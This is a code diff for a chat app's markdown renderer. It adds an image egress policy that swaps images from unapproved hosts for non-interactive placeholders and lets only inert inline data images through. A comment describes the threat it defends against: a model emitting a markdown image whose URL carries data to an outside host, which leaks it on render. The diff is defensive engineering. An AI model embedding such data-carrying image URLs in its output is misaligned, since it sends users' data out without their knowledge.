@@ -1,12 +1,13 @@
 import { memo, useEffect, useRef, useState } from 'react'
 import type { ReactNode, ReactElement, ComponentPropsWithoutRef } from 'react'
-import type { Options } from 'react-markdown'
-import ReactMarkdown from 'react-markdown'
+import type { Components, Options } from 'react-markdown'
+import ReactMarkdown, { defaultUrlTransform } from 'react-markdown'
 import remarkGfm from 'remark-gfm'
 import rehypeHighlight from 'rehype-highlight'
 import * as Icon from '../Icons.tsx'
 import { useT } from '../../lib/i18n.tsx'
 import { safeMessageMarkdown } from './safeMessageMarkdown.ts'
+import { imageVerdict, isInlineDataImage, useEgressPolicy } from '../../lib/egressPolicy.ts'
 
 // Plugin lists are module constants so a memoised segment re-renders only when
 // its own text changes (a fresh array per render would defeat memo).
@@ -100,7 +101,50 @@ function MarkdownTable({ node, children, ...rest }: ComponentPropsWithoutRef<'ta
   )
 }
 
-const COMPONENTS = { pre: CodeBlock, table: MarkdownTable }
+// The image policy (md-exfil T4). A markdown image is a request the browser sends
+// with no click, so the model's `![](https://host/?q=<data>)` would leak on
+// render. A source the policy does not allow is NEVER an <img>: it is a named,
+// non-interactive placeholder with the host (no "load anyway", by design). An
+// allowed source renders an <img> that swaps to the same placeholder when the
+// load fails (a dead link, or the CSP refusing it).
+function BlockedImage({ alt, host }: { alt: string; host: string | null }) {
+  const t = useT()
+  const shown = alt || t('message.imageAltFallback')
+  const label = host ? t('message.imageBlocked', { alt: shown, host }) : t('message.imageBlockedNoHost', { alt: shown })
+  return (
+    <span className="md-image-blocked" role="img" aria-label={label} title={label}>
+      <span aria-hidden>⌧ {shown}{host ? ` · ${host}` : ''}</span>
+    </span>
+  )
+}
+
+function MarkdownImage({ src, alt }: { src?: string; alt?: string; title?: string }) {
+  const policy = useEgressPolicy()
+  const [failed, setFailed] = useState<string | null>(null)
+  const v = imageVerdict(src, policy)
+  const text = alt || ''
+  if (v.blocked) return <BlockedImage alt={text} host={v.host} />
+  if (failed === src) {
+    let host: string | null = null
+    try {
+      host = new URL(src as string, location.href).host || null
+    } catch {
+      host = null
+    }
+    return <BlockedImage alt={text} host={host && host !== location.host ? host : null} />
+  }
+  return <img src={src} alt={text} loading="lazy" decoding="async" referrerPolicy="no-referrer" onError={() => setFailed(src ?? '')} />
+}
+
+// react-markdown's default transform empties a data: URL, which would turn an
+// inline data:image into a placeholder; a safe raster/svg data: image is
+// inert (no request), so it passes. Everything else keeps the default rule.
+export const markdownUrlTransform: NonNullable<Options['urlTransform']> = (url, key, node) =>
+  key === 'src' && node.tagName === 'img' && isInlineDataImage(url) ? url : defaultUrlTransform(url)
+
+// one object so every markdown renderer (chat, document page, DS README) applies the same policy
+export const MARKDOWN_COMPONENTS: Components = { pre: CodeBlock, table: MarkdownTable, img: MarkdownImage }
+const COMPONENTS = MARKDOWN_COMPONENTS
 
 /**
  * Chat markdown — the one renderer for answer prose, tool questions and tool
@@ -114,7 +158,7 @@ const COMPONENTS = { pre: CodeBlock, table: MarkdownTable }
  */
 const Markdown = memo(function Markdown({ text, streaming = false }: { text: string; streaming?: boolean }) {
   return (
-    <ReactMarkdown remarkPlugins={REMARK} rehypePlugins={streaming ? REHYPE_NONE : REHYPE_FINAL} components={COMPONENTS}>
+    <ReactMarkdown remarkPlugins={REMARK} rehypePlugins={streaming ? REHYPE_NONE : REHYPE_FINAL} components={COMPONENTS} urlTransform={markdownUrlTransform}>
       {safeMessageMarkdown(text)}
     </ReactMarkdown>
   )
